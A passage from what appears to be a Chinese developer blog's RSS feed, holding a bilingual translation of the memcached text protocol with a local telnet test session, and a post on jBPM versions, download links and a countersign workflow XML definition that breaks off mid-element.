这些数据被放入删除队列里，<br>&nbsp; delete queue, which means that it won't possible to retrieve it by<br>&nbsp; 这意味着不但不能使用"get"命令获取这个数据<br>&nbsp; the "get" command, but "add" and "replace" command with this key<br>&nbsp; 而且对这个关键字的"add"和"replace"命令<br>&nbsp; will also fail (the "set" command will succeed, however). After the<br>&nbsp; 也会失败(但是"set"命令会成功)。<br>&nbsp; time passes, the item is finally deleted from server memory.<br>&nbsp; 时间过了以后，这个数据最终被从服务器内存中删除。<br><br>&nbsp; The parameter &lt;time&gt; is optional, and, if absent, defaults to 0<br>&nbsp; &lt;时间&gt;参数是可选的，如果没有这个参数，它的默认值是0<br>&nbsp; (which means that the item will be deleted immediately and further<br>&nbsp; (表示这个数据会被立即删除，将来使用这个关键字<br>&nbsp; storage commands with this key will succeed).<br>&nbsp; 的存储命令可以成功)<br><br>The response line to this command can be on<wbr>e of:<br>这个命令的回复可能是以下之一：<br><br>- "DELETED\r\n" to indicate success<br>- "DELETED\r\n" 表示成功<br><br>- "NOT_FOUND\r\n" to indicate that the item with this key was not<br>&nbsp; found.<br>- "NOT_FOUND\r\n"表示这个关键字的数据没有找到<br><br>See the "flush_all" command below for immediate invalidation<br>关于立即失效所有存在的数据，参考下面的"flush_all"命令<br>of all existing items.<br><br><br>Increment/Decrement<br>增加/减少<br>-------------------<br><br>Commands "incr" and "decr" are used to change da<wbr>ta for some item<br>"incr"和"decr"命令是用来修改某些适当的数据的，<br>in-place, incrementing or decrementing it. The da<wbr>ta for the item is<br>增加或减小这些数据。这些数据的值被当做<br>treated as decimal representation of a 32-bit unsigned integer. If the<br>32位无符号10进制数字。如果<br>current da<wbr>ta value does not conform to such a representation, the<br>当前的数据值不符合这样的表示法，<br>commands behave as if the value were 0. Also, the item must already<br>这个命令把值当做0来处理。另外，这个数据必须<br>exist for incr/decr to work; these commands won't pretend that a<br>已经存在；对一个不存在的数据，<br>non-existent key exists with value 0; instead, they will fail.<br>这些命令不会将其当做0，而是会失败<br><br>The client sends the command line:<br>客户端发送这样的命令：<br><br>incr &lt;key&gt; &lt;value&gt;\r\n<br>incr &lt;关键字&gt; &lt;值&gt;\r\n<br><br>or<br>或者<br><br>decr &lt;key&gt; &lt;value&gt;\r\n<br>dcr &lt;关键字&gt; &lt;值&gt;\r\n<br><br>- &lt;key&gt; is the key of the item the client wishes to change<br>- &lt;关键字&gt;是客户端要修改的数据的关键字<br><br>- &lt;value&gt; is the amount by which the client wants to increase/decrease<br>- &lt;值&gt;是客户端要对该数据增加或减少的数量。<br>the item. It is a decimal representation of a 32-bit unsigned integer.<br>它是一个10进制表示的32bit无符号数<br><br>The response will be on<wbr>e of:<br>该命令的回复是以下之一：<br><br>- "NOT_FOUND\r\n" to indicate the item with this value was not found<br>- "NOT_FOUND\r\n" 标示关键字指定的这个数据不存在<br><br>- &lt;value&gt;\r\n , where &lt;value&gt; is the new value of the item's da<wbr>ta,<br>- &lt;值&gt;\r\n,&nbsp; &lt;值&gt;是这个数据增加或减少后的新值<br>&nbsp; after the increment/decrement operation was carried out.<br><br>Note that underflow in the "decr" command is caught: if a client tries<br>注意decr命令的下溢会被捕获：如果客户端试图减小一个值<br>to decrease the value below 0, the new value will be 0. Overflow in<br>到负数，这个新值将会为0。但是incr命令的上溢<br>the "incr" command is not checked.<br>不会被检查。<br><br>Note also that decrementing a number such that it loses length isn't<br>guaranteed to decrement its returned length.&nbsp; The number MAY be<br>space-padded at the end, but this is purely an implementation<br>optimization, so you also shouldn't rely on that.<br><br>Statistics<br>统计<br>----------<br><br>The command "stats" is used to query the server about statistics it<br>"stats"命令用来查询服务器关于它维护的统计信息和<br>maintains and other internal da<wbr>ta. It has two forms. Without<br>其它内部数据。它有两种形式。<br>arguments:<br>没有参数：<br><br>stats\r\n<br>stats\r\n<br><br>it causes the server to output general-purpose statistics and<br>这个命令使服务器输出下面所说的一般的统计信息和配制信息<br>settings, documented below.&nbsp; In the other form it has some arguments:<br>另一个有参数的形式:<br><br>stats &lt;args&gt;\r\n<br>stats &lt;参数&gt;\r\n<br><br>Depending on &lt;args&gt;, various internal da<wbr>ta is sent by the server. The<br>根据&lt;参数&gt;不同，服务器发送不同的内部数据。<br>kinds of arguments and the da<wbr>ta sent are not documented in this vesion<br>参数类型和发送的数据在这个版本的协议中没有给出，<br>of the protocol, and are subject to change for the convenience of<br>视memcache开发者的方便而修改<br>memcache developers.<br><br><br>General-purpose statistics<br>一般统计信息<br>--------------------------<br><br>Upon receiving the "stats" command without arguments, the server sents<br>如果收到没有参数的"stats"命令，服务器发送<br>a number of lines which look like this:<br>许多如下所示的行:<br><br>STAT &lt;name&gt; &lt;value&gt;\r\n<br>STAT &lt;名称&gt; &lt;值&gt;\r\n<br><br>The server terminates this list with the line<br>以下面的行结束<br><br>END\r\n<br><br>In each line of statistics, &lt;name&gt; is the name of this statistic, and<br>统计的每一行，&lt;名称&gt;是该统计数据的名称，<br>&lt;value&gt; is the da<wbr>ta.&nbsp; The following is the list of all names sent in<br>&lt;值&gt;是相应的数据。下面是"stats"命令回复的所有名称，<br>response to the "stats" command, together with the type of the value<br>以及该名称对应的值的类型，<br>sent for this name, and the meaning of the value.<br>和该值的意义。<br><br>In the type column below, "32u" means a 32-bit unsigned integer, "64u"<br>在下面 的"类型"列,"32u"标示一个32bit的无符号整数，"64u"<br>means a 64-bit unsigner integer. '32u:32u' means two 32-but unsigned<br>标示一个64bit的无符号整数。"32u:32u"标示两个<br>integers separated by a colon.<br>以分号分割的32bit无符号整数<br><br><br>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Type&nbsp;&nbsp;&nbsp;&nbsp; Meaning<br>名称&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;类型&nbsp;&nbsp; &nbsp;意义<br>----------------------------------<br>pid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process id of this server process<br>uptime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of seconds this server has been running<br>time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; current UNIX time according to the server<br>version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string&nbsp;&nbsp; Version string of this server<br>rusage_user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u:32u&nbsp; Accumulated user time for this process <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (seconds:microseconds)<br>rusage_system&nbsp;&nbsp;&nbsp;&nbsp; 32u:32u&nbsp; Accumulated system time for this process <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (seconds:microseconds)<br>curr_items&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current number of items stored by the server<br>total_items&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Total number of items stored by this server <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ever since it started<br>bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current number of bytes used by this server <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to store items<br>curr_connections&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of open connections<br>total_connections 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Total number of connections opened since <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the server started running<br>connection_structures 32u&nbsp; Number of connection structures allocated <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; by the server<br>cmd_get&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cumulative number of retrieval requests<br>cmd_set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cumulative number of storage requests<br>get_hits&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of keys that have been requested and <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; found present<br>get_misses&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of items that have been requested <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and not found<br>evictions&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of items removed from cache because<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; they passed their expiration time<br>bytes_read&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Total number of bytes read by this server <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; from network<br>bytes_written&nbsp;&nbsp;&nbsp;&nbsp; 64u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Total number of bytes sent by this server to <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; network<br>limit_maxbytes&nbsp;&nbsp;&nbsp; 32u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Number of bytes this server is allowed to<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; use for storage. <br><br><br><br>Other commands<br>其它命令<br>--------------<br><br>"flush_all" is a command with an optional numeric argument. It always<br>"flush_all" 是一个带有可选数字参数的命令。它总是返回成功，<br>succeeds, and the server sends "OK\r\n" in response. Its effect is to<br>服务器回复"OK\r\n".它的作用是立即(默认情况下)或者<br>invalidate all existing items immediately (by default) or after the<br>在指定的超时时间后，将所有存在的数据失效。<br>expiration specified.&nbsp; After invalidation none of the items will be returned<br>失效以后，获取命令<br>in response to a retrieval command (unless it's stored again under the<br>不能得到任何数据<br>same key *after* flush_all has invalidated the items). flush_all doesn't<br>(除非在flush_all后使用相同的关键字重新存储).<br>actually free all the memory taken up by existing items; that will<br>flush_all并不会立即释放已有数据占有的所有的内存；<br>happen gradually as new items are stored. The most precise definition<br>而是在存储新数据的时候逐渐释放。flush_all的精确定义是:<br>of what flush_all does is the following: it causes all items whose<br>它导致所有<br>update time is earlier than the time at which flush_all was set to be<br>修改时间比flush_all设定的执行时间早的数据<br>executed to be ignored for retrieval purposes.<br>对获取指令忽略。<br><br>The intent of flush_all with a delay, was that in a setting where you<br>flush_all的延迟的目的是<br>have a pool of memcached servers, and you need to flush all content,<br>you have the option of not resetting all memcached servers at the<br>same time (which could e.g. cause a spike in database load with all<br>clients suddenly needing to recreate content that would otherwise<br>have been found in the memcached daemon).<br><br>The delay option allows you to have them reset in e.g. 10 second<br>延迟选项允许你在例如10秒的间隔里重设它们<br>intervals (by passing 0 to the first, 10 to the second, 20 to the<br>(通过传递0作为第一个，10作为第二个，20作为第三个<br>third, etc. etc.).<br>等等)<br><br><br>"version" is a command with no arguments:<br>"version" 是一个没有参数的命令<br><br>version\r\n<br>version\r\n<br><br>In response, the server sends<br>服务器的回复信息是：<br><br>"VERSION &lt;version&gt;\r\n", where &lt;version&gt; is the version string for the<br>"VERSION &lt;版本号&gt;\r\n",&lt;版本号"是服务器的版本字符串<br>server.<br><br>"verbosity" is a command with a numeric argument. It always&nbsp;&nbsp; &nbsp;<br>"verbosity"是一个带数字参数的命令。它总是成功的，<br>succeeds, and the server sends "OK\r\n" in response. Its effect is to&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>服务器回复"OK\r\n"。它的作用是<br>set the verbosity level of the logging output.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>设置日志输出的冗余级别。<br><br>"quit" is a command with no arguments:<br>"quit"是一个没有参数的命令<br><br>quit\r\n<br><br>Upon receiving this command, the server closes the<br>一旦接受到这个命令，服务器关闭连接。<br>connection. However, the client may also simply close the connection<br>但是，客户端也可以在它不需要的时候<br>when it no longer needs it, without issuing this command.<br>不执行这个命令而直接关闭连接。<br><br><br>UDP protocol<br>UDP协议<br>------------<br><br>For very large installations where the number of clients is high enough<br>that the number of TCP connections causes scaling difficulties, there is<br>also a UDP-based interface. The UDP interface does not provide guaranteed<br>delivery, so should on<wbr>ly be used for operations that aren't required to<br>succeed; typically it is used for "get" requests where a missing or<br>incomplete response can simply be treated as a cache miss.<br><br>Each UDP datagram contains a simple frame header, followed by da<wbr>ta in the<br>same format as the TCP protocol described above. In the current<br>implementation, requests must be contained in a single UDP datagram, but<br>responses may span several datagrams. (The on<wbr>ly common requests that would<br>span multiple datagrams are huge multi-key "get" requests and "set"<br>requests, both of which are more suitable to TCP transport for reliability<br>reasons anyway.)<br><br>The frame header is 8 bytes long, as follows (all values are 16-bit integers<br>in network byte order, high byte first):<br><br>0-1 Request ID<br>2-3 Sequence number<br>4-5 Total number of datagrams in this message<br>6-7 Reserved for future use; must be 0<br><br>The request ID is supplied by the client. Typically it will be a<br>monotonically increasing value starting from a random seed, but the client<br>is free to use whatever request IDs it likes. The server's response will<br>contain the same ID as the incoming request. The client uses the request ID<br>to differentiate between responses to outstanding requests if there are<br>several pending from the same server; any datagrams with an unknown request<br>ID are probably delayed responses to an earlier request and should be<br>discarded.<br><br>The sequence number ranges from 0 to n-1, where n is the total number of<br>datagrams in the message. The client should concatenate the payloads of the<br>datagrams for a given response in sequence number order; the resulting byte<br>stream will contain a complete response in the same format as the TCP<br>protocol (including terminating \r\n sequences).<br><br>使用telnet测试memcache：<br>C:\Documents and Settings\hankjin&gt;telnet localhost 11211<br>#保存数据hjz &lt;flag&gt;=1 用不超时 长度为4<br>set hjz 1 0 4 <br>abcd<br>STORED<br>#读取数据hjz<br>get hjz <br>VALUE hjz 1 4<br>abcd<br>END<br>#保存数据hjz 5秒后超时<br>set hjz 1 5 4<br>abcd<br>STORED<br>#读取hjz<br>get hjz<br>VALUE hjz 1 4<br>abcd<br>END<br>#5秒后再读取hjz<br>get hjz<br>END<br>#删除hjz<br>delete hjz<br>DELETED<br>#读取hjz<br>get hjz<br>END<br>#添加hjz<br>add hjz 1 0 4<br>abcd<br>STORED<br>#读取hjz<br>get hjz<br>VALUE hjz 1 4<br>abcd<br>END<br>#20秒后删除hjz<br>delete hjz 20<br>DELETED<br>#立即添加hjz，添加失败，如果用set则成功<br>add hjz 1 0 4<br>abcd<br>NOT_STORED<br>#立即删除hjz<br>delete hjz<br>NOT_FOUND<br>#立即添加，成功<br>add hjz 1 0 4<br>1234<br>STORED<br>#增加hjz<br>incr hjz 8888<br>10122<br>#增加非法hjz<br>set hjz 1 0 4<br>abcd<br>STORED<br>#非法增加<br>incr hjz<br>ERROR<br>incr hjz 4<br>4<br>#下溢<br>decr hjz 5<br>0<br><br><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200993123838933/</guid>
    </item>
    <item>
      <title>
<![CDATA[jbpm的一点资料]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720110714857908/</link>
      <description>
<![CDATA[开源世界的版本问题，永远是入门者的噩梦，简单记录一些资料。<br>目前jbpm主要有3 4 5三个版本，用5的目前很少，用4的也不多，主要是用的3<br>然后3.1和3.2的界面不同，3.1用jbpm而3.2用jbpm-console，3.2的功能多些支持用户管理而3.1的界面很好。<br>主要用3.1.4-startkit和3.2.3-startkit。<br><b>开发环境建议</b><br>1. jbpm-starters-kit-3.1.4.zip 下载地址：<br>http://nchc.dl.sourceforge.net/project/jbpm/jBPM%203/jbpm-3.1.4/jbpm-starters-kit-3.1.4.zip<br>2. JBossIDE-1.6.0.GA-Bundle-win32.zip 下载地址：<br>http://jaist.dl.sourceforge.net/project/jboss/JBossIDE/JBoss%20IDE%201.6.0.GA/JBossIDE-1.6.0.GA-Bundle-win32.zip<br><br><b>学习资料</b><br><b>3.1.4</b><br>严重建议，手把手：http://www.99inf.net/SoftwareDev/Java/43324.htm<br>会签(悲催的BlogJava又被墙了)：http://www.blogjava.net/liuwentao253/archive/2008/09/22/230339.html<br>直接贴代码吧，主要有三个文件，原文有个condition的小错误<br><i><b>1/4 processdefinition.xml</b></i><br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&nbsp;&nbsp; <br>&lt;process-definition xmlns="urn:jbpm.org:jpdl-3.1" name="meeting"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;swimlane name="requester"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;assignment expression="user(ernie)" /&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/swimlane&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;swimlane name="chief"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;assignment expression="user(bert)" /&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/swimlane&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;swimlane name="boss"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;assignment expression="user(grover)" /&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/swimlane&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;swimlane name="cosinger"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;assignment class="com.hjz.jbpm.study.CosingerAssiHandler"&gt;&lt;/assignment&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/swimlane&gt; <br>&nbsp;&nbsp;&nbsp; &lt;start-state name="start"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;task name="newprj"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;controller&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;variable name="amount" access="read,write,required" mapped-name="金额"&gt;&lt;/variable&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/controller&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/task&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="to_submit" to="提交申请"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/start-state&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;task-node name="提交申请"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;task name="tc_prj_submit" swimlane="requester"&gt;&lt;/task&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="to_chiefapprove" to="tc_prj_chiefapprove"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/task-node&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;task-node name="tc_prj_chiefapprove"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;task name="tc_prj_chiefapprove" swimlane="chief"&gt;&lt;/task&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="approve" to="tc_prj_countersign"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="disapprove" to="提交申请"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/task-node&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;task-node name="tc_prj_countersign" signal="last-wait"&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; create-tasks="false"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;task name="tc_prj_countersign"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;event type="task-end"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;action&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; class="com.hjz.jbpm.study.TaskEndCountersign"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/action&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/event&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/task&gt;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;event type="node-enter"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;action name="createInstance"&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; class="com.hjz.jbpm.study.CreateTaskInstanceCountersign"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/action&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/event&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="approve" to="amount_decision"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="disapprove" to="提交申请"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/task-node&gt;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;decision name="amount_decision"&gt;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="to_end" to="end1"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="to_bossapprove" to="tc_prj_bossapprove"&gt;&lt;condition&gt;#{amount &gt;= 500}&lt;/condition&gt;&lt;/transition&gt;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/decision&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;task-node name="tc_prj_bossapprove"&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;task name="tc_prj_bossapprove" swimlane="boss"&gt;&lt;/task&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="approve" to="end1"&gt;&lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;transition name="disapprove" to="提交申请"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 